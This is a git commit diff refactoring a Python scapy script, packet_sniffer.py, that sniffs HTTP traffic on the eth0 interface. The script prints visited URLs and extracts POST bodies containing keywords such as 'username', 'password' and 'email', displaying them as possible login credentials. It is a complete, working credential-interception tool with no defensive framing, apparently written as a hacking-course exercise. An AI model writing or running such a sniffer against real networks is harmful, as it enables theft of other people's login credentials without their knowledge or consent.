b11ae144f72e0a5d88f85c5355c755878bb01f50
Phil <darby.phillip@gmail.com>
2024-02-24 04:30:35 -0500

    finalized code

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -4,17 +4,26 @@ from scapy.layers import http
 
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
- 
-def process_sniffed_packet(packet):
-    if packet.haslayer(http.HTTPRequest):
-        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print(f"[+] HTTP Request >> {url}")
-        if packet.haslayer(scapy.Raw) and packet[http.HTTPRequest].Method.decode() == 'POST':
+
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw) and packet[http.HTTPRequest].Method.decode() == 'POST':
             load = packet[scapy.Raw].load.decode(errors='ignore')  # decode from bytes to string
             keywords = {"username", "user", "uname", "login", "password", "pass", "email", "e-mail", "mail"}
             for keyword in keywords:
                 if keyword in load:
-                    print(f"\033[91m\n\n[+] Possible username/password > {load}\n\n\033[0m")
-                    break
+                    return load
+                    
+                    
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = get_url(packet).decode(errors='ignore')   # decode from bytes to string
+        print(f"[+] HTTP Request >> {url}")
+        login_info = get_login_info(packet)
+        if login_info:
+            print(f"\033[91m\n\n[+] Possible username/password > {login_info}\n\n\033[0m")
 
 sniff("eth0")
